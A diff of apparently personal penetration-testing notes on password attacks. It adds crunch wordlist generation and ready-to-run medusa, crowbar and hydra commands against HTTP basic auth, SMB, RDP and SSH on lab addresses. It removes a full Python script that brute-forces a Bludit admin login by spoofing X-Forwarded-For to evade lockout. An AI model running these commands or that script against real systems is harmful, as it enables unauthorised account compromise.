@@ -28,56 +28,41 @@ $[0-9]$[0-9]
 ```
 * run to mutate the list: `john --wordlist=bigTree-cewl.txt --rules --stdout > mutated.txt` 
 
+# Bruteforce wordlists (if you have a specific pw policy)
+In contrast to a dictionary attack, a brute force password attack calculates and tests every possible
+character combination that could make up a password until the correct one is found
 
-# HYDRA
+* for example pw policy: `[Capital Letter][2 x lower case letters] [2 x special chars][3 x numeric]`
+* check manual for crunch `man crunch` then we might generate random pws with: `crunch 8 8 -t ,@@^^%%%` => will exatly generate as described above
+Placeholder Character Translation
+```
+@ => Lower case alpha characters
+, => Upper case alpha characters
+% => Numeric characters
+^ => Special characters including space
+```
+* `crunch 4 6 0123456789ABCDEF -o crunch.txt` => create pws with length 4 to 6 with allowed chars "01...EF"
 
+# Bruteforcing different protocolls
+`medusa -d` to check with protocols can be bruteforced
+
+## http baseAuth with username and pw
+`medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin`
+
+## smb
+`medusa -h 192.168.174.10 -u admin -P /usr/share/wordlists/rockyou.txt -M smbnt`
+
+## rdp - Remote Desktop Protocol Attack (windows) with Crowbar
+Crowbar, formally known as Levye, is a network authentication cracking tool primarily designed to
+leverage SSH keys rather than passwords. It is also one of the few tools that can reliably and
+efficiently perform password attacks against the Windows Remote Desktop Protocol (RDP) service
+on modern versions of Windows.
+
+To invoke crowbar , we will specify the protocol ( -b ), the target server ( -s ), a username ( -u ), a
+wordlist ( -C ), and the number of threads ( -n ) => *rdp just support one thread*
+`crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1`
+
+## SSH Attack with THC-Hydra
 //using username “root” with a password list on ssh with 4 parallel tasks and verbose
-hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.0.13:22 -t 4 -V 
-
-trying out hydra: with brute forcing ssh
-
-#!/usr/bin/env python3
-import re
-import requests
-
-host = 'http://192.168.194.146/bludit'
-login_url = host + '/admin/login'
-username = 'admin'
-wordlist = []
-
-# Generate 50 incorrect passwords
-for i in range(50):
-    wordlist.append('Password{i}'.format(i = i))
-
-# Add the correct password to the end of the list
-wordlist.append('adminadmin')
-
-for password in wordlist:
-    session = requests.Session()
-    login_page = session.get(login_url)
-    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)
-
-    print('[*] Trying: {p}'.format(p = password))
-
-    headers = {
-        'X-Forwarded-For': password,
-        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
-        'Referer': login_url
-    }
-
-    data = {
-        'tokenCSRF': csrf_token,
-        'username': username,
-        'password': password,
-        'save': ''
-    }
-
-    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)
-
-    if 'location' in login_result.headers:
-        if '/admin/dashboard' in login_result.headers['location']:
-            print()
-            print('SUCCESS: Password found!')
-            print('Use {u}:{p} to login.'.format(u = username, p = password))
-            print()
-            break
+`hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.0.13:22 -t 4 -V`
+or: `hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1`
